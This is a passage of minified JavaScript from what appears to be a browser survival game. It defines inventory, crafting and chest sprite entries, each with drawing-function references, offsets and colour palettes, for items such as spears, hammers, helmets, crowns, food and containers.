                    }], .12, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_CRAB_SPEAR] = sprite[ze.INV_CRAB_SPEAR],
                    sprite[ze.CHEST_CRAB_SPEAR] = sprite[ze.INV_CRAB_SPEAR],
                    sprite[ze.INV_WOOD_SPEAR] = O(1, [{
                        f: Ft,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#58452b", "#47341d", "#765d42", "#c3be9a", "#7f6d52"]
                    }], .12, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_WOOD_SPEAR] = sprite[ze.INV_WOOD_SPEAR],
                    sprite[ze.INV_SPEAR] = O(1, [{
                        f: xt,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#4d2d14", "#432516", "#c3be9a", "#7f6d52", "#7a7575", "#454749", "#8c8787", "#939393", "#5f6061", "#aaa6a6"]
                    }], .12, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_SPEAR] = sprite[ze.INV_SPEAR],
                    sprite[ze.INV_GOLD_SPEAR] = O(1, [{
                        f: Jt,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#493e26", "#382e19", "#a69e39", "#9c8828", "#bab143", "#c4bc51", "#b29c32", "#d2ca59"]
                    }], .12, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_GOLD_SPEAR] = sprite[ze.INV_GOLD_SPEAR],
                    sprite[ze.INV_DIAMOND_SPEAR] = O(1, [{
                        f: Xt,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#262114", "#211108", "#4ba8b4", "#198a82", "#6ccad7", "#63c9d6", "#29aaa1", "#7bd9e6"]
                    }], .12, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_DIAMOND_SPEAR] = sprite[ze.INV_DIAMOND_SPEAR],
                    sprite[ze.INV_AMETHYST_SPEAR] = O(1, [{
                        f: jt,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#262114", "#211108", "#9443b1", "#6f1988", "#a752c6", "#9e35be", "#8c29aa", "#b864d6"]
                    }], .12, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_AMETHYST_SPEAR] = sprite[ze.INV_AMETHYST_SPEAR],
                    sprite[ze.INV_DRAGON_SPEAR] = O(1, [{
                        f: qt,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#1e2b34", "#151c24", "#99d7dd", "#7dcbd1", "#c6e8eb", "#aadee8", "#b7e2e5"]
                    }], .38, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_DRAGON_SPEAR] = sprite[ze.INV_DRAGON_SPEAR],
                    sprite[ze.CHEST_DRAGON_SPEAR] = sprite[ze.INV_DRAGON_SPEAR],
                    sprite[ze.INV_HAMMER] = O(1, [{
                        f: ai,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#4d2d14", "#432516", "#939393", "#5f6061"]
                    }], .52, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_HAMMER] = sprite[ze.INV_HAMMER],
                    sprite[ze.INV_SPANNER] = O(1, [{
                        f: B0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#939393", "#5f6061"]
                    }], .3, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_SPANNER] = sprite[ze.INV_SPANNER],
                    sprite[ze.INV_SUPER_HAMMER] = O(1, [{
                        f: qi,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#9b5927", "#7a3610", "#1e0302", "#0d825b", "#6bd16e", "#17915d", "#89e5aa", "#16935d", "#a0efc4", "#28b26d", "#cdf4cb", "#42cc90"]
                    }], .52, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_SUPER_HAMMER] = sprite[ze.INV_SUPER_HAMMER],
                    sprite[ze.INV_HAMMER_GOLD] = O(1, [{
                        f: ai,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#493e26", "#382e19", "#c4bc51", "#b29c32"]
                    }], .52, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_HAMMER_GOLD] = sprite[ze.INV_HAMMER_GOLD],
                    sprite[ze.INV_HAMMER_DIAMOND] = O(1, [{
                        f: ai,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#262114", "#211108", "#63c9d6", "#29aaa1"]
                    }], .52, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_HAMMER_DIAMOND] = sprite[ze.INV_HAMMER_DIAMOND],
                    sprite[ze.INV_HAMMER_AMETHYST] = O(1, [{
                        f: ai,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#262114", "#211108", "#b864d6", "#8c29aa"]
                    }], .52, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_HAMMER_AMETHYST] = sprite[ze.INV_HAMMER_AMETHYST],
                    sprite[ze.INV_HAMMER_REIDITE] = [],
                    sprite[ze.INV_HAMMER_REIDITE][0] = IMAGES.INV_HAMMER_REIDITE_OUT,
                    sprite[ze.INV_HAMMER_REIDITE][1] = IMAGES.INV_HAMMER_REIDITE_IN,
                    sprite[ze.INV_HAMMER_REIDITE][2] = IMAGES.INV_HAMMER_REIDITE_CLICK,
                    sprite[ze.CHEST_HAMMER_REIDITE] = sprite[ze.INV_HAMMER_REIDITE],
                    sprite[ze.CRAFT_HAMMER_REIDITE] = sprite[ze.INV_HAMMER_REIDITE],
                    sprite[ze.INV_EMERALD_MACHINE] = [],
                    sprite[ze.INV_EMERALD_MACHINE][0] = IMAGES.INV_EMERALD_MACHINE_OUT,
                    sprite[ze.INV_EMERALD_MACHINE][1] = IMAGES.INV_EMERALD_MACHINE_IN,
                    sprite[ze.INV_EMERALD_MACHINE][2] = IMAGES.INV_EMERALD_MACHINE_CLICK,
                    sprite[ze.CHEST_EMERALD_MACHINE] = sprite[ze.INV_EMERALD_MACHINE],
                    sprite[ze.CRAFT_EMERALD_MACHINE] = sprite[ze.INV_EMERALD_MACHINE],
                    sprite[ze.INV_EXTRACTOR_MACHINE_STONE] = [],
                    sprite[ze.INV_EXTRACTOR_MACHINE_STONE][0] = IMAGES.INV_EXTRACTOR_MACHINE_STONE_OUT,
                    sprite[ze.INV_EXTRACTOR_MACHINE_STONE][1] = IMAGES.INV_EXTRACTOR_MACHINE_STONE_IN,
                    sprite[ze.INV_EXTRACTOR_MACHINE_STONE][2] = IMAGES.INV_EXTRACTOR_MACHINE_STONE_CLICK,
                    sprite[ze.CHEST_EXTRACTOR_MACHINE_STONE] = sprite[ze.INV_EXTRACTOR_MACHINE_STONE],
                    sprite[ze.CRAFT_EXTRACTOR_MACHINE_STONE] = sprite[ze.INV_EXTRACTOR_MACHINE_STONE],
                    sprite[ze.INV_EXTRACTOR_MACHINE_GOLD] = [],
                    sprite[ze.INV_EXTRACTOR_MACHINE_GOLD][0] = IMAGES.INV_EXTRACTOR_MACHINE_GOLD_OUT,
                    sprite[ze.INV_EXTRACTOR_MACHINE_GOLD][1] = IMAGES.INV_EXTRACTOR_MACHINE_GOLD_IN,
                    sprite[ze.INV_EXTRACTOR_MACHINE_GOLD][2] = IMAGES.INV_EXTRACTOR_MACHINE_GOLD_CLICK,
                    sprite[ze.CHEST_EXTRACTOR_MACHINE_GOLD] = sprite[ze.INV_EXTRACTOR_MACHINE_GOLD],
                    sprite[ze.CRAFT_EXTRACTOR_MACHINE_GOLD] = sprite[ze.INV_EXTRACTOR_MACHINE_GOLD],
                    sprite[ze.INV_EXTRACTOR_MACHINE_DIAMOND] = [],
                    sprite[ze.INV_EXTRACTOR_MACHINE_DIAMOND][0] = IMAGES.INV_EXTRACTOR_MACHINE_DIAMOND_OUT,
                    sprite[ze.INV_EXTRACTOR_MACHINE_DIAMOND][1] = IMAGES.INV_EXTRACTOR_MACHINE_DIAMOND_IN,
                    sprite[ze.INV_EXTRACTOR_MACHINE_DIAMOND][2] = IMAGES.INV_EXTRACTOR_MACHINE_DIAMOND_CLICK,
                    sprite[ze.CHEST_EXTRACTOR_MACHINE_DIAMOND] = sprite[ze.INV_EXTRACTOR_MACHINE_DIAMOND],
                    sprite[ze.CRAFT_EXTRACTOR_MACHINE_DIAMOND] = sprite[ze.INV_EXTRACTOR_MACHINE_DIAMOND],
                    sprite[ze.INV_EXTRACTOR_MACHINE_AMETHYST] = [],
                    sprite[ze.INV_EXTRACTOR_MACHINE_AMETHYST][0] = IMAGES.INV_EXTRACTOR_MACHINE_AMETHYST_OUT,
                    sprite[ze.INV_EXTRACTOR_MACHINE_AMETHYST][1] = IMAGES.INV_EXTRACTOR_MACHINE_AMETHYST_IN,
                    sprite[ze.INV_EXTRACTOR_MACHINE_AMETHYST][2] = IMAGES.INV_EXTRACTOR_MACHINE_AMETHYST_CLICK,
                    sprite[ze.CHEST_EXTRACTOR_MACHINE_AMETHYST] = sprite[ze.INV_EXTRACTOR_MACHINE_AMETHYST],
                    sprite[ze.CRAFT_EXTRACTOR_MACHINE_AMETHYST] = sprite[ze.INV_EXTRACTOR_MACHINE_AMETHYST],
                    sprite[ze.INV_EXTRACTOR_MACHINE_REIDITE] = [],
                    sprite[ze.INV_EXTRACTOR_MACHINE_REIDITE][0] = IMAGES.INV_EXTRACTOR_MACHINE_REIDITE_OUT,
                    sprite[ze.INV_EXTRACTOR_MACHINE_REIDITE][1] = IMAGES.INV_EXTRACTOR_MACHINE_REIDITE_IN,
                    sprite[ze.INV_EXTRACTOR_MACHINE_REIDITE][2] = IMAGES.INV_EXTRACTOR_MACHINE_REIDITE_CLICK,
                    sprite[ze.CHEST_EXTRACTOR_MACHINE_REIDITE] = sprite[ze.INV_EXTRACTOR_MACHINE_REIDITE],
                    sprite[ze.CRAFT_EXTRACTOR_MACHINE_REIDITE] = sprite[ze.INV_EXTRACTOR_MACHINE_REIDITE],
                    sprite[ze.INV_LOCK] = O(1, [{
                        f: wi,
                        x: -2,
                        y: -2,
                        a: 1,
                        r: 0,
                        c: ["#141414", "#816511", "#c4a23a", "#3a3a3a"]
                    }], .8, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.CRAFT_LOCK] = sprite[ze.INV_LOCK],
                    sprite[ze.INV_LOCKPICK] = O(1, [{
                        f: Ui,
                        x: -2,
                        y: -2,
                        a: 1,
                        r: -Math.PI / 5,
                        c: ["#141414", "#c4a23a", "#816511"]
                    }], .08, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.CRAFT_LOCKPICK] = sprite[ze.INV_LOCKPICK],
                    sprite[ze.INV_DRAGON_HEART] = O(1, [{
                        f: Xi,
                        x: -2,
                        y: -2,
                        a: 1,
                        r: 0,
                        c: ["#141414", "#178a99", "#0a6372", "#03282e"]
                    }], .3, ["#2b5c48", "#2b5c48", "#2b5c48"], .7),
                    sprite[ze.INV_LAVA_HEART] = O(1, [{
                        f: Xi,
                        x: -2,
                        y: -2,
                        a: 1,
                        r: 0,
                        c: ["#120202", "#991616", "#750a0a", "#120202"]
                    }], .3, ["#2b5c48", "#2b5c48", "#2b5c48"], .7),
                    sprite[ze.INV_RESURRECTION] = O(1, [{
                        f: Yi,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#347f93", "#54a4ba"]
                    }, {
                        f: Ji,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#347f93", "#54a4ba", "#1c2528", "#a9e4ed", "#86d4e0", "#959da0", "#697072", "#929da0", "#afb9bc", "#418ba5", "#59b8ce"]
                    }, {
                        f: xi,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#a9e4ed", "#86d4e0"]
                    }, {
                        f: Fi,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#a9e4ed", "#86d4e0", "#418ba5", "#59b8ce"]
                    }], .3, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_RESURRECTION] = sprite[ze.INV_RESURRECTION],
                    sprite[ze.INV_TOTEM] = O(1, [{
                        f: Wi,
                        x: 45,
                        y: 70,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#4c3a15", "#634828", "#564021"]
                    }], .6, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_TOTEM] = sprite[ze.INV_TOTEM],
                    sprite[ze.INV_AMETHYST_HELMET] = O(1, [{
                        f: Pi,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#8c55b7", "#652d8e", "#79359e", "#5eccd1", "#4badad", "#9e6ac6"]
                    }], .52, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_AMETHYST_HELMET] = sprite[ze.INV_AMETHYST_HELMET],
                    sprite[ze.INV_WINTER_HOOD] = O(1, [{
                        f: S0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#2a2938", "#242330", "#313041", "#1b1a25"]
                    }], .12, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_WINTER_HOOD] = sprite[ze.INV_WINTER_HOOD],
                    sprite[ze.INV_HOOD] = O(1, [{
                        f: N0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#2a2938", "#242330", "#313041"]
                    }], .25, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_HOOD] = sprite[ze.INV_HOOD],
                    sprite[ze.INV_WINTER_PEASANT] = O(1, [{
                        f: m0,
                        x: 0,
                        y: 3,
                        a: 1,
                        r: 0,
                        c: ["#1d1d22", "#e2e1e1", "#d2cbcb", "#cfcbc8", "#beb5b5", "#ada0a0"]
                    }], .39, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_WINTER_PEASANT] = sprite[ze.INV_WINTER_PEASANT],
                    sprite[ze.INV_PEASANT] = O(1, [{
                        f: m0,
                        x: 0,
                        y: 3,
                        a: 1,
                        r: 0,
                        c: ["#1d1d22", "#8c7654", "#785f4c", "#a88e6c", "#785f4c", "#705845"]
                    }], .39, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_PEASANT] = sprite[ze.INV_PEASANT],
                    sprite[ze.INV_CROWN_GREEN] = O(1, [{
                        f: W0,
                        x: 0,
                        y: 10,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#A5A244", "#D8DC74", "#C0BF55", "#49B669", "#19994C", "#71C187"]
                    }], .15, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_CROWN_GREEN] = sprite[ze.INV_CROWN_GREEN],
                    sprite[ze.INV_CROWN_ORANGE] = O(1, [{
                        f: W0,
                        x: 0,
                        y: 10,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#A5A244", "#D8DC74", "#C0BF55", "#C45727", "#994617", "#DB9358"]
                    }], .15, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_CROWN_ORANGE] = sprite[ze.INV_CROWN_ORANGE],
                    sprite[ze.INV_CROWN_BLUE] = O(1, [{
                        f: W0,
                        x: 0,
                        y: 10,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#A5A244", "#D8DC74", "#C0BF55", "#2792C1", "#196599", "#59C0D8"]
                    }], .15, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_CROWN_BLUE] = sprite[ze.INV_CROWN_BLUE],
                    sprite[ze.INV_CROWN_CRAB] = O(1, [{
                        f: Vt,
                        x: -1,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#000000", "#b03431", "#94312d", "#bd3c33", "#de5445"]
                    }], .15, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_CROWN_CRAB] = sprite[ze.INV_CROWN_CRAB],
                    sprite[ze.CHEST_CROWN_CRAB] = sprite[ze.INV_CROWN_CRAB],
                    sprite[ze.INV_DRAGON_HELMET] = O(1, [{
                        f: di,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#cae9eb", "#75bcae", "#ffffff", "#51736d", "#2b4d48", "#1b3a3a", "#80ccca", "#59ada7"]
                    }], .2, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_DRAGON_HELMET] = sprite[ze.INV_DRAGON_HELMET],
                    sprite[ze.INV_DRAGON_SWORD] = O(1, [{
                        f: Zi,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#284c4a", "#193533", "#c7efef", "#7fccca"]
                    }], .75, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_DRAGON_SWORD] = sprite[ze.INV_DRAGON_SWORD],
                    sprite[ze.INV_DRAGON_CUBE] = O(1, [{
                        f: e0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#44bae0", "#9fdae9", "#7dd1ea", "#c6e8ef"]
                    }], .55, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_DRAGON_ORB] = O(1, [{
                        f: $i,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#44bae0", "#9fdae9", "#7dd1ea", "#c6e8ef"]
                    }], .55, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_LAVA_CUBE] = O(1, [{
                        f: e0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#e04444", "#e99f9f", "#eb7e7e", "#eec6c6"]
                    }], .55, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_LAVA_ORB] = O(1, [{
                        f: $i,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#e04444", "#e99f9f", "#eb7e7e", "#eec6c6"]
                    }], .55, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_GEMME_GREEN] = O(1, [{
                        f: ji,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#59ba72", "#94d966", "#5aa628", "#0d1b1c", "#38874d"]
                    }], .35, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_GEMME_ORANGE] = O(1, [{
                        f: ji,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#C45727", "#de7d46", "#DB9358", "#0d1b1c", "#994617"]
                    }], .35, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_GEMME_BLUE] = O(1, [{
                        f: ji,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#3a9dbd", "#59C0D8", "#48abcb", "#0d1b1c", "#196599"]
                    }], .35, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_SHOVEL] = O(1, [{
                        f: G0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#6d5041", "#4f3d35", "#939393", "#5f6061", "#757575"]
                    }], .45, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_SHOVEL] = sprite[ze.INV_SHOVEL],
                    sprite[ze.INV_SHOVEL_GOLD] = O(1, [{
                        f: G0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#493e26", "#382e19", "#c4bc51", "#b29c32", "#b4ac45"]
                    }], .45, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_SHOVEL_GOLD] = sprite[ze.INV_SHOVEL_GOLD],
                    sprite[ze.INV_SHOVEL_DIAMOND] = O(1, [{
                        f: G0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#262114", "#211108", "#63c9d6", "#29aaa1", "#42aab8"]
                    }], .45, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_SHOVEL_DIAMOND] = sprite[ze.INV_SHOVEL_DIAMOND],
                    sprite[ze.INV_SHOVEL_AMETHYST] = O(1, [{
                        f: G0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#262114", "#211108", "#b864d6", "#8c29aa", "#a853c7"]
                    }], .45, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_SHOVEL_AMETHYST] = sprite[ze.INV_SHOVEL_AMETHYST],
                    sprite[ze.INV_EXPLORER_HAT] = O(1, [{
                        f: fi,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#c9a65f", "#ae863f", "#655530", "#4a391c", "#ebdd79", "#4a421c"]
                    }], .35, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_EXPLORER_HAT] = sprite[ze.INV_EXPLORER_HAT],
                    sprite[ze.INV_WOOD_HELMET] = O(1, [{
                        f: Li,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#252525", "#73583e", "#493425", "#7d6144"]
                    }], .35, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_WOOD_HELMET] = sprite[ze.INV_WOOD_HELMET],
                    sprite[ze.INV_STONE_HELMET] = O(1, [{
                        f: Gi,
                        x: 0,
                        y: -2,
                        a: 1,
                        r: 0,
                        c: ["#252525", "#808080", "#4a4a4a", "#9e9c8b", "#615c53", "#686969", "#8a8776", "#555555", "#747474", "#969696", "#454545"]
                    }], .4, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_STONE_HELMET] = sprite[ze.INV_STONE_HELMET],
                    sprite[ze.INV_GOLD_HELMET] = O(1, [{
                        f: yi,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#dbce71", "#b29c32", "#c4bc51"]
                    }], .35, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_GOLD_HELMET] = sprite[ze.INV_GOLD_HELMET],
                    sprite[ze.INV_DIAMOND_HELMET] = O(1, [{
                        f: Hi,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#717171", "#485252", "#555555", "#65c7cd", "#4aadad", "#358d8b", "#c1e6ea", "#a6dce4"]
                    }], .45, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_DIAMOND_HELMET] = sprite[ze.INV_DIAMOND_HELMET],
                    sprite[ze.INV_BOOK] = O(1, [{
                        f: zi,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#511f00", "#2f1300", "#ffffff", "#d4d4d4", "#5b2400", "#984e21"]
                    }], .15, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_BOOK] = sprite[ze.INV_BOOK],
                    sprite[ze.INV_PAPER] = O(1, [{
                        f: Bi,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#221e1b", "#ffffff", "#f6f0e7"]
                    }], .3, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.CRAFT_PAPER] = sprite[ze.INV_PAPER],
                    sprite[ze.INV_AMETHYST] = O(1, [{
                        f: li,
                        x: -5,
                        y: -5,
                        a: 1,
                        r: 0,
                        c: ["#1d051e", "#c27add", "#cd98e5"]
                    }], .31, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_SAND] = O(1, [{
                        f: _0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#D7C393", "#a48c6c"]
                    }], .22, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_ICE] = O(1, [{
                        f: E0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#93CBCE", "#E9F6F6"]
                    }], .3, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.INV_GROUND] = O(1, [{
                        f: _0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#866432", "#6b4f25"]
                    }], .22, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_BUCKET_FULL] = O(1, [{
                        f: L0,
                        x: 3,
                        y: 2,
                        a: 1,
                        r: 0,
                        c: ["#1e2021", "#674C2A", "#4C3B19", "#2f2211", "#785931", "#1678a2"]
                    }], .22, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_BUCKET_EMPTY] = O(1, [{
                        f: f0,
                        x: 3,
                        y: 2,
                        a: 1,
                        r: 0,
                        c: ["#1e2021", "#674C2A", "#4C3B19", "#2f2211", "#785931", "#1678a2"]
                    }], .22, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.CRAFT_BUCKET_FULL] = sprite[ze.INV_BUCKET_FULL],
                    sprite[ze.CRAFT_BUCKET_EMPTY] = sprite[ze.INV_BUCKET_EMPTY],
                    sprite[ze.INV_WELL] = O(1, [{
                        f: s0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#1e2021", "#717273", "#606162", "#a09f9f", "#878787", "#454545"]
                    }], .1, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_WELL] = sprite[ze.INV_WELL],
                    sprite[ze.INV_BOTTLE_FULL] = O(1, [{
                        f: v0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#C6AF81", "#C98435", "#B26F31", "#53A4D5", "#388AC7", "#C1C0C0", "#EAEAEA"]
                    }], .18, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.INV_BOTTLE_EMPTY] = O(1, [{
                        f: M0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#C6AF81", "#C98435", "#B26F31", "#53A4D5", "#388AC7", "#C1C0C0", "#EAEAEA"]
                    }], .18, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.CRAFT_BOTTLE_FULL] = sprite[ze.INV_BOTTLE_FULL],
                    sprite[ze.CRAFT_BOTTLE_EMPTY] = sprite[ze.INV_BOTTLE_EMPTY],
                    sprite[ze.INV_COOKIE] = O(1, [{
                        f: _t,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#eedacc", "#dfbda7", "#dab094", "#63391a", "#523124"]
                    }], .3, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_COOKIE] = sprite[ze.INV_COOKIE],
                    sprite[ze.INV_CANDY] = O(1, [{
                        f: Et,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#1a1011", "#e29c2b", "#b76413", "#d6c418", "#e0bf32", "#b78a1a", "#aa1a17", "#cc9f2f", "#cc741d", "#b51524", "#bc1522", "#991922", "#a01ed5", "#d51e81"]
                    }], .3, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.INV_FERRERO] = O(1, [{
                        f: ut,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#1a1011", "#693c2a", "#54311f", "#9f7a3d", "#492d1d", "#dbb175", "#54311f", "#9f7a3d", "#604720"]
                    }], .6, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.INV_BREAD] = O(1, [{
                        f: i0,
                        x: 0,
                        y: -2,
                        a: 1,
                        r: 0,
                        c: ["#1d051e", "#bf8d51", "#7d5133", "#e8d6bf", "#e0c8a9", "#ab7a3f"]
                    }], .17, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_BREAD] = sprite[ze.INV_BREAD],
                    sprite[ze.INV_FOODFISH] = O(1, [{
                        f: St,
                        x: -3,
                        y: -5,
                        a: 1,
                        r: 0,
                        c: ["#1d051e", "#63767c", "#424f51", "#6c8288", "#536468", "#202020", "#ffffff", "#806f60", "#514942", "#756557"]
                    }], .23, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.INV_FOODFISH_COOKED] = O(1, [{
                        f: mt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#1d051e", "#42261A", "#281818"]
                    }], .23, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_FOODFISH_COOKED] = sprite[ze.INV_FOODFISH_COOKED],
                    sprite[ze.INV_DIVING_MASK] = O(1, [{
                        f: Ct,
                        x: -3,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#1e2021", "#65A8B7", "#2E85A0", "#14275B", "#081826", "#1A3163", "#0C1944", "#89C4CE", "#2E85A0"]
                    }], .2, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
